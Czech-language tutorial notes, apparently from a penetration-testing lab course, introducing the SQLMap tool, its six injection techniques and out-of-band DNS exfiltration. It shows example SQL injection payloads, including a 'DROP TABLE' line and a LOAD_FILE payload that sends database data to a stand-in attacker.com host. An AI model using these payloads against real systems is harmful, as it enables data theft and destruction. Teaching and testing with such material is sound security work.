## 🛠️ Co je SQLMap?

**SQLMap** je otevřený (_open-source_) automatizovaný nástroj napsaný v Pythonu, který slouží k detekci a zneužívání zranitelností typu SQL Injection (SQLi) a k převzetí kontroly nad databázovými servery.

Bash

```
# Základní spuštění nástroje proti zranitelné URL:
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

### 📋 Hlavní funkce nástroje:

- **Automatická detekce a fingerprinting:** Určení typu a verze DBMS, detekce WAF/IDS/IPS.
    
- **Enumerace a exfiltrace:** Získávání databází, tabulek, sloupců, hashů hesel a uživatelů.
    
- **Systémové operace:** Čtení/zápis souborů v OS a spouštění příkazů operačního systému (přes `--os-shell`).
    
- **Obcházení ochranných prvků:** Integrované skripty (`tamper`) pro obcházení WAF a sanitizačních filtrů.
    

## ⚙️ Podporované techniky SQLi (`--technique`)

SQLMap podporuje všech 6 základních typů SQL Injection. Při podrobném nápovědném přepínači `sqlmap -hh` jsou označovány akronymem **`BEUSTQ`**:

```
                       ┌───────────────────────────────┐
                       │     Techniky SQLi v SQLMap    │
                       └───────────────┬───────────────┘
                                       │
     ┌───────────┬───────────┬─────────┴─────────┬───────────┬───────────┐
     ▼           ▼           ▼                   ▼           ▼           ▼
     B           E           U                   S           T           Q
  Boolean     Error       UNION               Stacked     Time-based  Inline
   Blind       Based      Query               Queries      Blind     Queries
```

| **Zkratka** | **Typ techniky**        | **Popis a rychlost exfiltrace**                                                                                 | **Příklad SQL Injection**        |
| ----------- | ----------------------- | --------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| **B**       | **Boolean-based blind** | Vyhodnocuje odchylky v odpovědi serveru (TRUE vs. FALSE). Pomalá technika (~7–8 požadavků na 1 znak).           | `AND 1=1`                        |
| **E**       | **Error-based**         | Využívá chybové hlášky databáze k navrácení bloků dat (_chunks_). Rychlá technika.                              | `AND GTID_SUBSET(@@version,0)`   |
| **U**       | **UNION query-based**   | Připojuje vlastní dotaz přes `UNION`. **Nejrychlejší technika** (stáhne celou tabulku v jedné odpovědi).        | `UNION ALL SELECT 1,@@version,3` |
| **S**       | **Stacked queries**     | Spojuje více samostatných SQL dotazů oddělených středníkem. Umožňuje spustit `INSERT`/`DELETE` i OS příkazy.    | `; DROP TABLE users`             |
| **T**       | **Time-based blind**    | Vyhodnocuje logiku na základě časové prodlevy odpovědi serveru (`SLEEP`). Pomalá technika (používá se v nouzi). | `AND 1=IF(2>1,SLEEP(5),0)`       |
| **Q**       | **Inline queries**      | Vkládá poddotaz uvnitř původního dotazu. Méně častá technika.                                                   | `SELECT (SELECT @@version) from` |

## 🌐 Mimo-pásmová SQLi (Out-of-Band SQLi / OOB)

V případech, kdy jsou ostatní techniky nepoužitelné nebo extrémně pomalé (např. u slepé Time-Based SQLi), podporuje SQLMap také **Out-of-band SQLi přes DNS exfiltraci**.

Přinutí zranitelný databázový server odeslat DNS dotaz na útočníkův DNS server (např. `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`), kde subdoména obsahuje vyextrahovaná databázová data.